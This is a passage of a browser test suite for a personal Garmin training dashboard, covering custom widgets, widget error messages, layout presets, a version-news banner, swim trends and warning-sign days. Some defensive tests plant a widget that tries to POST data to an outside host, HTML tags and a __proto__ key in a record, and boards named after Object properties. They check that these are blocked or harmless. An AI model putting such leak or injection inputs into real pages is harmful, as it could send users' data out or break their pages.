    );
    expect(await page.textContent("[data-id=note]")).toContain("Don't skip Z2 & strides");
    expect(errors).toEqual([]);
  });

  it("blocks a custom widget that sends data out", async () => {
    const code = `
      fetch("https://example.invalid/x", { method: "POST", body: "1" })
        .then(() => { el.textContent = "sent"; })
        .catch(() => { el.textContent = "blocked"; });`;
    const { page, errors } = await open(
      browser,
      pageFile({ widgets: [custom("leak", code)], layout: on("leak") }),
    );
    await page.waitForFunction(() =>
      document.querySelector("[data-id=leak]")?.textContent?.includes("blocked"),
    );
    expect(errors.join("\n")).toMatch(/Content Security Policy|Content-Security-Policy/);
  });

  it("shows n/a, not 0, for a load that no activity has", async () => {
    const noLoadData = {
      ...data,
      zones: null,
      activities: data.activities.map(noLoad),
      previousActivities: data.previousActivities.map(noLoad),
      v: DASHBOARD_VERSION,
      notes: [],
    };
    const { page, errors } = await open(browser, pageFile({ data: noLoadData }), {
      hash: "#running",
    });
    const load = page
      .locator(".kpi", { has: page.locator(".kpi-label", { hasText: "Garmin training load" }) })
      .first();
    expect(await load.textContent()).toContain("n/a");
    expect(errors).toEqual([]);
  });

  it("shows the error of a failing widget in its own tile only", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        widgets: [
          custom("broken", "throw new Error('no data here');"),
          custom("bad", "this is not code ("),
          custom("text", "throw 'plain text';"),
          custom("thing", "throw { code: 1 };"),
          custom("msg", "throw { message: 'no rows' };"),
          custom("long", "throw { text: 'x'.repeat(300) };"),
          custom("loop", "const o = { a: 1 }; o.self = o; throw o;"),
          custom("deep", "const a = { b: { c: null } }; a.b.c = a; throw a;"),
          custom("shared", "const s = { n: 1 }; throw { x: s, y: s };"),
          custom("longLoop", "const o = {}; o.self = o; o.t = 'x'.repeat(120); throw o;"),
          custom("big", "throw { n: 1n };"),
          custom("nothing", "throw undefined;"),
          custom("none", "throw null;"),
          custom("num", "throw { message: 5 };"),
          // {"t":"…"} is 8 characters plus the text: 100 in all fits, 101 is cut
          custom("fits", "throw { t: 'x'.repeat(92) };"),
          custom("over", "throw { t: 'x'.repeat(93) };"),
        ],
        layout: on(
          "broken",
          "bad",
          "text",
          "thing",
          "msg",
          "long",
          "loop",
          "deep",
          "shared",
          "longLoop",
          "big",
          "nothing",
          "none",
          "num",
          "fits",
          "over",
          "coachNotes",
        ),
      }),
    );
    expect(await page.textContent("[data-id=broken] .error")).toBe(
      "This widget failed: no data here",
    );
    expect(await page.textContent("[data-id=bad] .error")).toContain("This widget failed");
    // a thrown value that is not an Error still fills the placeholder
    expect(await page.textContent("[data-id=text] .error")).toBe("This widget failed: plain text");
    // an object shows its message, else a short JSON text
    expect(await page.textContent("[data-id=thing] .error")).toBe('This widget failed: {"code":1}');
    expect(await page.textContent("[data-id=msg] .error")).toBe("This widget failed: no rows");
    expect(await page.textContent("[data-id=num] .error")).toBe(
      'This widget failed: {"message":5}',
    );
    const long = (await page.textContent("[data-id=long] .error")) ?? "";
    expect(long).toMatch(/^This widget failed: \{"text":"x+…$/);
    expect(long.length - "This widget failed: ".length).toBe(100);
    expect(await page.textContent("[data-id=fits] .error")).toBe(
      `This widget failed: {"t":"${"x".repeat(92)}"}`,
    );
    expect(await page.textContent("[data-id=over] .error")).toBe(
      `This widget failed: {"t":"${"x".repeat(93)}…`,
    );
    // an object met again on its own path is a cycle; one shared by two keys is not
    expect(await page.textContent("[data-id=loop] .error")).toBe(
      'This widget failed: {"a":1,"self":"[Circular]"}',
    );
    expect(await page.textContent("[data-id=deep] .error")).toBe(
      'This widget failed: {"b":{"c":"[Circular]"}}',
    );
    expect(await page.textContent("[data-id=shared] .error")).toBe(
      'This widget failed: {"x":{"n":1},"y":{"n":1}}',
    );
    const loopStart = '{"self":"[Circular]","t":"';
    expect(await page.textContent("[data-id=longLoop] .error")).toBe(
      `This widget failed: ${loopStart}${"x".repeat(99 - loopStart.length)}…`,
    );
    // JSON cannot write a BigInt: String() is the fallback
    expect(await page.textContent("[data-id=big] .error")).toBe(
      "This widget failed: [object Object]",
    );
    expect(await page.textContent("[data-id=nothing] .error")).toBe(
      "This widget failed: undefined",
    );
    expect(await page.textContent("[data-id=none] .error")).toBe("This widget failed: null");
    expect(await page.textContent("[data-id=coachNotes] .notes")).toContain("Load");
    expect(errors).toEqual([]);
  });

  it("draws doughnut and pie charts, and shows an error for a chart type the page does not have", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        widgets: [
          custom("donut", chartOf("doughnut")),
          custom("cake", chartOf("pie")),
          custom("radar", chartOf("radar")),
        ],
        layout: on("donut", "cake", "radar"),
      }),
    );
    expect(
      await page.$$eval("[data-id=donut] canvas, [data-id=cake] canvas", (c) => c.length),
    ).toBe(2);
    expect(await page.textContent("[data-id=radar] .error")).toContain("radar");
    expect(errors).toEqual([]);
  });

  it("offers custom widgets in the catalogue", async () => {
    const { page } = await open(
      browser,
      pageFile({ widgets: [custom("mine", "el.textContent = 'mine';")], layout: on("coachNotes") }),
    );
    await startEdit(page);
    await page.click("text=Add widget");
    await page.click(".catalogue li:has-text('Custom mine') button");
    expect(await tiles(page)).toEqual(["coachNotes", "mine"]);
  });

  it("adds the languages of the page to the menu, with English for a missing text", async () => {
    const i18n = { de: { title: "Training + Erholung" }, it: { title: "Il mio allenamento" } };
    const { page } = await open(browser, pageFile({ i18n }), { locale: "it-IT" });
    // a page text replaces the built-in Italian one
    expect(await page.textContent("h1")).toBe("Il mio allenamento");
    expect(await page.$$eval("#lang option", (o) => o.map((x) => x.textContent))).toContain(
      "Deutsch",
    );
    await page.click(".account summary");
    await page.selectOption("#lang", "de");
    expect(await page.textContent("h1")).toBe("Training + Erholung");
    expect(await page.textContent("[data-id=readiness] h2")).toBe("Readiness today");
    expect(await page.evaluate(() => document.documentElement.lang)).toBe("de");
  });
});

/** Every running preset widget but the one that a release adds: workoutTrend. */
const UNTIL_TREND = {
  running: preset("running")
    .map((i) => i.widget)
    .filter((w) => w !== "workoutTrend"),
};

const running = (rev: string, extra: object = {}) => ({
  rev,
  base: "preset",
  seen: UNTIL_TREND,
  boards: {
    running: [
      { id: "typeKpis", widget: "typeKpis", span: 3 },
      { id: "activities", widget: "activities", span: 3 },
    ],
  },
  ...extra,
});

describe("new preset widgets on edited boards", () => {
  const withWorkouts = { workouts: true };
  const openRunning = (layout: unknown, settings: object = withWorkouts) =>
    open(browser, pageFile({ layout, settings }), { hash: "#running" });

  it("shows a widget that the board has not met, full width, in its preset place", async () => {
    const { page, errors } = await openRunning(running("r0"));
    // the record lists the other widgets as met, so they stay off the board
    expect(await tiles(page)).toEqual(["typeKpis", "workoutTrend", "activities"]);
    expect(await page.getAttribute("[data-id=workoutTrend]", "class")).toContain("span-3");
    expect(errors).toEqual([]);
  });

  it("adds it to a browser layout of the same rev, with no banner", async () => {
    const file = pageFile({ layout: running("r0"), settings: withWorkouts });
    const { page } = await open(browser, file, { hash: "#running" });
    await page.evaluate(
      (seen) =>
        localStorage.setItem(
          `garmin-layout:${location.pathname}`,
          JSON.stringify({
            baseRev: "r0",
            layout: {
              base: "preset",
              seen,
              boards: { running: [{ id: "typeKpis", widget: "typeKpis", span: 3 }] },
            },
          }),
        ),
      UNTIL_TREND,
    );
    await page.reload();
    await page.waitForSelector(".page");
    expect(await tiles(page)).toContain("workoutTrend");
    expect(await page.$(".banner")).toBeNull();
  });

  it("adds it to both layouts of the banner", async () => {
    const { page } = await openRunning(running("r1"));
    await page.evaluate(
      (seen) =>
        localStorage.setItem(
          `garmin-layout:${location.pathname}`,
          JSON.stringify({
            baseRev: "r0",
            layout: {
              base: "preset",
              seen,
              boards: { running: [{ id: "activities", widget: "activities", span: 3 }] },
            },
          }),
        ),
      UNTIL_TREND,
    );
    await page.reload();
    await page.waitForSelector(".banner");
    expect(await tiles(page)).toContain("workoutTrend");
    await page.click(".banner >> text=Keep mine");
    expect(await tiles(page)).toContain("workoutTrend");
    expect(await saved(page)).toContain("workoutTrend");
    await page.evaluate(() => localStorage.clear());
    await page.reload();
    await page.waitForSelector(".page");
    expect(await tiles(page)).toContain("workoutTrend");
  });

  it("writes nothing to the browser on load, and Done with no change saves nothing", async () => {
    const { page } = await openRunning(running("r0"));
    expect(await saved(page)).toBeNull();
    await startEdit(page);
    await page.click("text=Done");
    expect(await page.textContent("#announce")).toBe("No changes to save");
    expect(await saved(page)).toBeNull();
  });

  it("keeps a widget that you removed removed after a reload", async () => {
    const { page } = await openRunning(running("r0"));
    await startEdit(page);
    await page.click("[aria-label='Hide Workout trend']");
    await page.click(".edit-bar >> text=Add widget");
    await page.click("dialog >> text=Remove Workout trend");
    await page.click("text=Done");
    expect(await tiles(page)).not.toContain("workoutTrend");
    expect(JSON.parse((await saved(page)) ?? "null").layout.seen.running).toContain("workoutTrend");
    await page.reload();
    await page.waitForSelector(".page");
    expect(await tiles(page)).not.toContain("workoutTrend");
  });

  it("adds nothing to a blank layout or to a board that the layout does not list", async () => {
    const blank = await openRunning({ ...running("r0"), base: "blank" });
    expect(await tiles(blank.page)).toEqual(["typeKpis", "activities"]);
    const other = await open(browser, pageFile({ layout: running("r0"), settings: withWorkouts }), {
      hash: "#recovery",
    });
    expect(await tiles(other.page)).not.toContain("workoutTrend");
  });

  describe("a layout from before the record", () => {
    // records: a release added it to the preset, so it arrives; what the page left out does not
    const old = {
      base: "preset",
      boards: { running: [{ id: "typeKpis", widget: "typeKpis", span: 3 }] },
    };
    const store = (page: Page, baseRev: string) =>
      page.evaluate(
        ([rev, layout]) =>
          localStorage.setItem(
            `garmin-layout:${location.pathname}`,
            JSON.stringify({ baseRev: rev, layout }),
          ),
        [baseRev, old] as const,
      );

    it("gives the page layout nothing back that it left out", async () => {
      const { page } = await openRunning({ rev: "r0", ...old });
      expect(await tiles(page)).toEqual(["typeKpis", "records"]);
    });

    it("gives a browser layout of the same rev nothing back", async () => {
      const { page } = await openRunning(running("r0"));
      await store(page, "r0");
      await page.reload();
      await page.waitForSelector(".page");
      expect(await tiles(page)).toEqual(["typeKpis", "records"]);
    });

    it("gives the browser layout of the banner nothing back", async () => {
      const { page } = await openRunning(running("r1"));
      await store(page, "r0");
      await page.reload();
      await page.waitForSelector(".banner");
      await page.click(".banner >> text=Keep mine");
      expect(await tiles(page)).toEqual(["typeKpis", "records"]);
    });
  });

  it("opens a page whose layout lists a board named like a property of Object", async () => {
    const layout = JSON.parse(
      '{"rev":"r0","base":"preset","boards":{"constructor":[],"toString":[]}}',
    );
    const { page, errors } = await open(browser, pageFile({ layout }));
    expect(await page.$(".page")).not.toBeNull();
    expect(errors).toEqual([]);
  });

  it("does not show a widget that the page settings withhold", async () => {
    const { page } = await openRunning(running("r0"), {});
    expect(await tiles(page)).toEqual(["typeKpis", "activities"]);
  });
});

const ownCode = () => {
  const code = pageCode(readFileSync("dist/dashboard.html", "utf8"));
  if (code.from !== "template" || code.id === undefined) throw new Error("build has no page code");
  return code.id;
};

const record = (extra: object = {}) => ({
  from: "0.6.0",
  server: "0.7.0",
  code: ownCode(),
  widgets: {},
  ...extra,
});

describe("new in this version", () => {
  const note = "[role=region][aria-label='New in this version']";
  const withWorkouts = { workouts: true };

  it("shows the version, the link and a close button, and the widgets by board", async () => {
    const refresh = record({ widgets: { running: ["workoutTrend"] } });
    const { page, errors } = await open(browser, pageFile({ refresh, settings: withWorkouts }));
    const text = await page.innerText(note);
    expect(text).toContain("This page now uses version 0.7.0 of garmin-personal-mcp.");
    expect(text).toContain("New widgets on your boards:");
    expect(await page.innerText(`${note} li`)).toBe("Run: Workout trend");
    const { url } = JSON.parse(readFileSync("site/site.json", "utf8"));
    expect(await page.getAttribute(`${note} a`, "href")).toBe(`${url}whats-new.html`);
    expect(await page.$(`${note} button[class~=btn]`)).not.toBeNull();
    expect(errors).toEqual([]);
  });

  it("puts it after the late note and the layout banner", async () => {
    const layout = { rev: "r1", base: "preset", seen: MET, boards: {} };
    const file = pageFile({
      layout,
      refresh: record(),
      data: { ...data, v: DASHBOARD_VERSION, updated: hours(-26), due: hours(-2) },
    });
    const { page } = await open(browser, file);
    await page.evaluate(() =>
      localStorage.setItem(
        `garmin-layout:${location.pathname}`,
        JSON.stringify({
          baseRev: "r0",
          layout: {
            rev: "r0",
            base: "preset",
            boards: { all: [{ id: "coachNotes", widget: "coachNotes", span: 3 }] },
          },
        }),
      ),
    );
    await page.reload();
    await page.waitForSelector(".banner");
    expect(
      await page.$$eval(".banner", (els) => els.map((e) => e.getAttribute("aria-label"))),
    ).toEqual(["Refresh missed", "New layout", "New in this version"]);
  });

  it("closes for good in this browser, says so, and moves focus to the board", async () => {
    const { page, errors } = await open(browser, pageFile({ refresh: record() }));
    await page.click(`${note} button`);
    expect(await page.$(note)).toBeNull();
    expect(await page.textContent("#announce")).toBe("Note closed");
    expect(await page.evaluate(() => document.activeElement?.id)).toBe("board");
    await page.reload();
    await page.waitForSelector(".page");
    expect(await page.$(note)).toBeNull();
    expect(errors).toEqual([]);
  });

  it("shows again for a new page code, after a close for another one", async () => {
    const init = `localStorage.setItem("garmin-news:" + location.pathname, "aaaaaaaaaaaaaaaa")`;
    const { page } = await open(browser, pageFile({ refresh: record() }), { init });
    expect(await page.$(note)).not.toBeNull();
  });

  it("hides in edit mode and comes back on Done", async () => {
    const { page } = await open(browser, pageFile({ refresh: record() }));
    await startEdit(page);
    expect(await page.$(note)).toBeNull();
    await page.click("text=Done");
    expect(await page.$(note)).not.toBeNull();
  });

  it.each([
    ["no record", null],
    ["a record for other page code", { from: "n/a", server: "0.7.0", code: "aaaaaaaaaaaaaaaa" }],
  ])("shows nothing for %s", async (_name, refresh) => {
    const { page, errors } = await open(browser, pageFile({ refresh }));
    expect(await page.$(note)).toBeNull();
    expect(errors).toEqual([]);
  });

  it("shows nothing on a page with no page code id", async () => {
    const file = pageFile({ refresh: record() });
    writeFileSync(
      file,
      readFileSync(file, "utf8").replace(/<meta name="garmin-template"[^>]*>/, ""),
    );
    const { page, errors } = await open(browser, file);
    expect(await page.$(note)).toBeNull();
    expect(errors).toEqual([]);
  });

  it("works with a storage that throws, and closes for this tab", async () => {
    const init = `Object.defineProperty(window, "localStorage", { get() { throw new Error("blocked"); } })`;
    const { page, errors } = await open(browser, pageFile({ refresh: record() }), { init });
    expect(await page.$(note)).not.toBeNull();
    await page.click(`${note} button`);
    expect(await page.$(note)).toBeNull();
    await page.click("[role=tab][data-tab=running]");
    await page.click("[role=tab][data-tab=all]");
    expect(await page.$(note)).toBeNull();
    expect(errors).toEqual([]);
  });

  it("lists only the boards that the page shows", async () => {
    // the page shows All, Recovery and Bike: the running board is hidden by the settings
    const refresh = record({ widgets: { running: ["workoutTrend"], cycling: ["bikeDetails"] } });
    const { page, errors } = await open(
      browser,
      pageFile({ refresh, settings: { ...withWorkouts, sports: ["cycling"] } }),
    );
    expect(await page.$$eval(`${note} li`, (els) => els.map((e) => e.textContent))).toEqual([
      "Bike: Rides",
    ]);
    expect(errors).toEqual([]);
  });

  it("writes it in the page language, and in English where the page has no texts", async () => {
    const refresh = record({ widgets: { running: ["workoutTrend"] } });
    const italian = await open(
      browser,
      pageFile({ refresh, settings: { ...withWorkouts, languages: ["en", "it"] } }),
      { locale: "it-IT" },
    );
    expect(await italian.page.innerText(".banner li")).toBe("Corsa: Andamento degli allenamenti");
    expect(await italian.page.getAttribute(".banner", "aria-label")).toBe(
      "Novità di questa versione",
    );
    // a language that the page adds with no news texts falls back to English
    const own = await open(
      browser,
      pageFile({
        refresh,
        settings: { ...withWorkouts, languages: ["en", "xx"] },
        i18n: { xx: { title: "Xx" } },
      }),
      { locale: "xx" },
    );
    expect(await own.page.getAttribute(note, "aria-label")).toBe("New in this version");
  });

  it("shows only the text and the link when no widget is left, and no version when it is not x.y.z", async () => {
    const none = await open(browser, pageFile({ refresh: record({ server: "0.7" }) }));
    expect(await none.page.$(`${note} ul`)).toBeNull();
    expect(await none.page.innerText(`${note} p`)).toBe(
      "This page now uses a new version of garmin-personal-mcp.",
    );
    expect(await none.page.$(`${note} a`)).not.toBeNull();
  });

  it("shows names and titles as text, and survives a record of wrong types", async () => {
    const hostile = record({
      widgets: { running: ["<b>x</b>"], "<i>y</i>": ["workoutTrend"] },
    });
    const bold = { id: "ride", title: "<b>Ride</b>", span: 1, code: "el.textContent = 'x';" };
    const a = await open(
      browser,
      pageFile({ refresh: hostile, settings: withWorkouts, widgets: [bold] }),
    );
    expect(await a.page.$(`${note} b, ${note} i`)).toBeNull();
    expect(a.errors).toEqual([]);
    const viaTitle = record({ widgets: { running: ["ride"] } });
    const b = await open(browser, pageFile({ refresh: viaTitle, widgets: [bold] }));
    expect(await b.page.innerText(`${note} li`)).toBe("Run: <b>Ride</b>");
    expect(await b.page.$(`${note} b`)).toBeNull();
    for (const refresh of [
      [],
      7,
      "x",
      record({ widgets: [] }),
      JSON.parse('{"code":"' + ownCode() + '","widgets":{"__proto__":["workoutTrend"]}}'),
    ]) {
      const { page, errors } = await open(browser, pageFile({ refresh }));
      expect(errors).toEqual([]);
      expect(await page.$(".page")).not.toBeNull();
    }
  });
});

/** The test page with extra activities before the fixture's own. */
const withActivities = (extra: unknown[]) =>
  pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: [...extra, ...data.activities] } });
/** The test page with these activities instead of the fixture's own. */
/** The text of the KPI widget of the Run board with extra activities. */
const runKpiText = async (activities: unknown[]) => {
  const { page } = await open(browser, withActivities(activities), { hash: "#running" });
  return page.textContent("[data-id=typeKpis]");
};
/** The tick labels of the y axis of the steps chart. */
const stepsAxis = (page: Page) =>
  page.evaluate(() => {
    const c = Object.values(window.Chart!.instances).find((x) =>
      x.canvas.closest("[data-widget=steps]"),
    )!;
    return c.scales.y.ticks.map((t) => t.label as string);
  });

/** A 1 km swim of 40 lengths in 25 m. */
const poolLap = (n: number, start: string, duration: string, strokes: number) => ({
  id: 9300 + n,
  name: "Pool Swim",
  type: "lap_swimming",
  sport: "swimming",
  start: `${start} 07:00:00`,
  km: 1,
  duration,
  lengths: 40,
  strokes,
  poolLengthM: 25,
});

describe("small numbers on the boards", () => {
  const swim = {
    id: 9101,
    name: "Pool Swim",
    type: "lap_swimming",
    sport: "swimming",
    start: "2026-10-24 07:00:00",
    km: 1.5,
    duration: "30:00",
  };
  const race = {
    id: 9102,
    name: "Town Race",
    type: "running",
    sport: "running",
    start: "2026-10-20 08:00:00",
    km: 21.1,
    duration: "1:41:16",
    elapsed: "1:45:00",
    race: true,
  };
  const estimatedText = "Some loads are estimates: the activity has no Garmin load.";

  it("shows the swimming pace per 100 m", async () => {
    const { page, errors } = await open(browser, withActivities([swim]), { hash: "#swimming" });
    expect((await kpiTexts(page, "typeKpis"))["Average pace"]?.[0]).toBe("2:00/100 m");
    expect(errors).toEqual([]);
  });

  describe("swim trend", () => {
    const swims = [
      poolLap(6, "2026-10-19", "20:00", 720),
      poolLap(5, "2026-10-12", "20:00", 720),
      poolLap(4, "2026-10-05", "20:00", 720),
      poolLap(3, "2026-09-28", "21:40", 800),
      poolLap(2, "2026-09-21", "21:40", 800),
      poolLap(1, "2026-09-14", "21:40", 800),
    ];
    const openWater = {
      id: 9310,
      name: "Lake Swim",
      type: "open_water_swimming",
      sport: "swimming",
      start: "2026-10-20 07:00:00",
      km: 2.5,
      duration: "55:00",
      swolf: 60,
      strokes: 1500,
    };

    it("compares pace and strokes of one pool length, and leaves out open water", async () => {
      const { page, errors } = await open(browser, withActivities([openWater, ...swims]), {
        hash: "#swimming",
      });
      const kpis = await kpiTexts(page, "swimTrend");
      expect(kpis.Pace?.[0]).toBe("2:00/100 m");
      expect(kpis.Pace?.[1]).toContain("vs the 3 swims before");
      expect(kpis.Pace?.[1]).toContain("▼");
      expect(kpis["Strokes/length"]?.[0]).toBe("18.0");
      const pace = await chartDataset(page, "swimTrend", "Pace");
      const strokes = await chartDataset(page, "swimTrend", "Strokes/length");
      // oldest first, and two colours that differ
      expect(pace.data).toEqual([130, 130, 130, 120, 120, 120]);
      expect(strokes.data).toEqual([20, 20, 20, 18, 18, 18]);
      const colors = await page.evaluate(() =>
        Object.values(window.Chart!.instances)
          .filter((c) => c.canvas.closest("[data-widget=swimTrend]"))
          .flatMap((c) => c.data.datasets.map((d) => d.borderColor)),
      );
      expect(new Set(colors).size).toBe(2);
      const text = await page.innerText("[data-id=swimTrend]");
      expect(text).toContain("Pool swims of 25 m only: 6 swims from");
      expect(text).toContain("Swims left out: 1 (");
      expect(errors).toEqual([]);
    });

    it("shows one swim without a chart or a comparison", async () => {
      const { page, errors } = await open(browser, withActivities([swims[0]]), {
        hash: "#swimming",
      });
      expect(await page.locator("[data-id=swimTrend] canvas").count()).toBe(0);
      const text = await page.innerText("[data-id=swimTrend]");
      expect(text).toContain("2:00/100 m");
      expect(text).not.toContain("swims before");
      expect(text).not.toContain("Swims left out");
      expect(errors).toEqual([]);
    });

    it("shows the mean of the recent swims, a faster pace as good, and up as better on both axes", async () => {
      const { page, errors } = await open(
        browser,
        withActivities([
          poolLap(6, "2026-10-19", "21:00", 760),
          poolLap(5, "2026-10-12", "20:00", 720),
          poolLap(4, "2026-10-05", "19:00", 680),
          ...swims.slice(3),
        ]),
        { hash: "#swimming" },
      );
      const kpis = await kpiTexts(page, "swimTrend");
      // the mean of the 3 newest swims, not the newest one
      expect(kpis.Pace?.[0]).toBe("2:00/100 m");
      expect(kpis["Strokes/length"]?.[0]).toBe("18.0");
      const good = await page.$$eval("[data-id=swimTrend] .kpi .delta", (d) =>
        d.map((x) => x.className),
      );
      expect(good).toHaveLength(2);
      for (const name of good) expect(name).toContain("good");
      const reversed = await page.evaluate(() =>
        Object.values(window.Chart!.instances)
          .filter((c) => c.canvas.closest("[data-id=swimTrend]"))
          .map((c) => [c.options.scales?.y?.reverse, c.options.scales?.y1?.reverse]),
      );
      expect(reversed).toEqual([[true, true]]);
      expect(errors).toEqual([]);
    });

    it("reads slower swims with more strokes as bad", async () => {
      const worse = [
        ...swims.slice(3).map((s, i) => ({ ...s, id: 9320 + i })),
        ...swims.slice(0, 3),
      ];
      const dated = worse.map((s, i) => ({ ...s, start: swims[i].start }));
      const { page, errors } = await open(browser, withActivities(dated), { hash: "#swimming" });
      const bad = await page.$$eval("[data-id=swimTrend] .kpi .delta", (d) =>
        d.map((x) => x.className),
      );
      expect(bad).toHaveLength(2);
      for (const name of bad) expect(name).toContain("bad");
      expect(errors).toEqual([]);
    });

    it("draws 4 swims but compares none: 3 swims against 1 is not like with like", async () => {
      const { page, errors } = await open(browser, withActivities(swims.slice(0, 4)), {
        hash: "#swimming",
      });
      expect(await page.locator("[data-id=swimTrend] canvas").count()).toBe(1);
      expect(await page.innerText("[data-id=swimTrend]")).not.toContain("swims before");
      expect(errors).toEqual([]);
    });

    it("converts pace, distance per stroke and the longest swim to the units of the profile", async () => {
      const file = pageFile({
        data: { ...data, units: "statute_us", activities: [openWater, ...swims] },
      });
      const { page, errors } = await open(browser, file, { hash: "#swimming" });
      const kpis = await kpiTexts(page, "swimTrend");
      // the newest 3 swims: 120 s per 100 m is 109.7 s per 100 yd
      expect(kpis.Pace?.[0]).toBe("1:50/100 yd");
      const pace = await chartDataset(page, "swimTrend", "Pace");
      expect(pace.data[0]).toBeCloseTo(118.9, 1);
      const cells = await page.$$eval("[data-id=swimDetails] tbody tr:first-child td", (c) =>
        c.map((x) => x.textContent),
      );
      expect(cells[8]).toBe("5.47 ft");
      expect(await page.innerText("[data-id=records]")).toContain("1.55 mi");
      expect(errors).toEqual([]);
    });

    it("says that open water has no trend", async () => {
      const { page, errors } = await open(browser, withActivities([openWater]), {
        hash: "#swimming",
      });
      expect(await page.innerText("[data-id=swimTrend]")).toContain("No pool swims with strokes");
      expect(errors).toEqual([]);
    });

    it("adds strokes per length and distance per stroke, n/a in open water", async () => {
      const { page, errors } = await open(browser, withActivities([openWater, swims[0]]), {
        hash: "#swimming",
      });
      const cells = await page.$$eval("[data-id=swimDetails] tbody tr", (r) =>
        r.map((x) => [...x.children].map((c) => c.textContent)),
      );
      // Open water first: no strokes per length; 2,500 m over 1,500 strokes
      expect(cells[0].slice(7, 9)).toEqual(["n/a", "1.67 m"]);
      expect(cells[1].slice(7, 9)).toEqual(["18.0", "1.39 m"]);
      expect(errors).toEqual([]);
    });

    it("names the longest swim in the records of the board", async () => {
      const { page, errors } = await open(browser, withActivities([openWater, swims[0]]), {
        hash: "#swimming",
      });
      const text = await page.innerText("[data-id=records]");
      expect(text).toContain("Longest session · Swim");
      expect(text).toContain("2.50 km");
      expect(text).toContain("Lake Swim");
      expect(errors).toEqual([]);
    });
  });

  it("shows the elapsed time of a race, and the moving time without it", async () => {
    const { page, errors } = await open(browser, withActivities([race]), { hash: "#running" });
    const times = await page.$$eval("[data-id=races] tbody tr", (r) =>
      r.map((x) => [x.children[1].textContent, x.children[3].textContent]),
    );
    expect(times).toContainEqual(["Town Race", "1:45:00"]);
    expect(times).toContainEqual(["City 10K", "49:00"]);
    expect(errors).toEqual([]);
  });

  it("says that a load is an estimate only when one is", async () => {
    const noLoadRun = { ...row(9103, "Easy Run", "2026-10-21 07:00:00") };
    expect(await runKpiText([{ ...noLoadRun, avgHR: 150 }])).toContain(estimatedText);
    expect(await runKpiText([])).not.toContain(estimatedText);
    // no load and no heart rate: there is nothing to estimate from
    expect(await runKpiText([noLoadRun])).not.toContain(estimatedText);
  });

  it("writes the numbers of a chart axis in the language of the page", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({ settings: { languages: ["en", "it"] } }),
      { hash: "#walking", locale: "en-US" },
    );
    // an English browser, an Italian page
    await page.click(".account summary");
    await page.selectOption("#lang", "it");
    const italian = await stepsAxis(page);
    expect(italian.some((l) => /^\d+\.\d{3}$/.test(l))).toBe(true);
    expect(italian.some((l) => l.includes(","))).toBe(false);
    // the change of language draws the axis again
    await page.selectOption("#lang", "en");
    expect((await stepsAxis(page)).some((l) => /^\d+,\d{3}$/.test(l))).toBe(true);
    expect(errors).toEqual([]);
  });
});

/** Changes of one day of the page data: fields to set, or null to drop that day's row. */
type SignEdit = Record<string, { hrv?: object | null; rec?: object | null }>;
const edited = (list: { date: string }[], edits: SignEdit, key: "hrv" | "rec", from: string) =>
  list
    .filter((r) => r.date >= from)
    .flatMap((r) => {
      const e = edits[r.date]?.[key];
      return e === null ? [] : [{ ...r, ...e }];
    });
/** The synthetic page with these days changed; rows before `from` dropped. */
const signsPage = (edits: SignEdit, from = "", settings = {}) =>
  pageFile({
    data: {
      ...data,
      hrv: edited(data.hrv, edits, "hrv", from),
      recovery: edited(data.recovery, edits, "rec", from),
    },
    settings,
  });
/** A sign day: last night's HRV under the low end of its range (58) and a sleep score under 60. */
const BAD = { hrv: { hrv: 50 }, rec: { sleepScore: 55 } };
const signsTile = async (page: Page) =>
  page.$eval("[data-id=warningSigns] .tile-body", (b) => ({
    head: b.querySelector(".ws-head")?.textContent,
    warn: b.querySelector(".ws-head")?.classList.contains("warn"),
    from: b.querySelector(".ws-from")?.textContent ?? null,
    lines: [...b.querySelectorAll(".ws-lines li")].map((li) => [li.textContent, li.className]),
    dots: [...b.querySelectorAll(".ws-dots li")].map((li) => li.className),
    titles: [...b.querySelectorAll(".ws-dots li")].map((li) => li.getAttribute("title")),
    alt: [...b.querySelectorAll(".ws-dots li .sr-only")].map((s) => s.textContent),
    label: b.querySelector(".ws-days")?.textContent,
    note: b.querySelector(".note")?.textContent,
  }));
const openSigns = async (file: string, options = {}) => {
  const opened = await open(browser, file, { hash: "#recovery", ...options });
  expect(await opened.page.$$(".tile .error")).toEqual([]);
  expect(opened.errors).toEqual([]);
  return opened.page;
};
const SIGNS_NOTE =
  "Signs: resting HR 5 bpm or more above its 7-day average, last night's HRV under its range, a sleep score under 60. A day with 2 or more signs is a sign day; 2 sign days in a row are a warning. The dashboard's own rule, not a diagnosis.";

describe("warning signs", () => {
  it("flags 2 sign days in a row, with the numbers of the newest day and a 7-day strip", async () => {
    const page = await openSigns(
      signsPage({
        "2026-10-25": BAD,
        "2026-10-26": { hrv: { hrv: 50 }, rec: { sleepScore: 55, rhr: 58 } },
      }),
    );
    const clear =
      "Oct 20 · no signs · Resting HR 55 bpm, 7-day average 51.9 bpm · HRV last night 69 ms, range low 58 ms · Sleep score 79";
    const sign =
      "Oct 26 · warning signs · Resting HR 58 bpm, 7-day average 52.1 bpm · HRV last night 50 ms, range low 58 ms · Sleep score 55";
    const tile = await signsTile(page);
    expect(tile).toEqual({
      head: "2 days in a row with warning signs",
      warn: true,
      from: null,
      lines: [
        ["⚠ Resting HR 58 bpm, 7-day average 52.1 bpm", "warn"],
        ["⚠ HRV last night 50 ms, range low 58 ms", "warn"],
        ["⚠ Sleep score 55", "warn"],
      ],
      dots: [...Array(5).fill("dot clear"), "dot sign", "dot sign"],
      titles: [clear, ...tile.titles.slice(1, 6), sign],
      alt: tile.titles,
      label: "Last 7 days",
      note: SIGNS_NOTE,
    });
    expect(await page.textContent("[data-id=warningSigns] h2")).toBe("Warning signs");
  });

  it.each([
    ["2026-10-14", "13 days in a row with warning signs"],
    ["2026-10-13", "14 or more days in a row with warning signs"],
  ])("counts the sign days from %s up to the newest day", async (first, head) => {
    const edits = Object.fromEntries(
      Array.from({ length: 14 }, (_, i) => addDays("2026-10-13", i))
        .filter((d) => d >= first)
        .map((d) => [d, BAD]),
    );
    const tile = await signsTile(await openSigns(signsPage(edits)));
    expect([tile.head, tile.warn]).toEqual([head, true]);
  });

  it("gives one sign day a soft note, and fewer dots when the rows start later", async () => {
    const page = await openSigns(signsPage({ "2026-10-26": BAD }, "2026-10-24"));
    const tile = await signsTile(page);
    expect([tile.head, tile.warn, tile.from, tile.lines, tile.dots]).toEqual([
      "1 day with signs: watch the next one",
      false,
      null,
      [
        ["Resting HR 55 bpm, 7-day average n/a", ""],
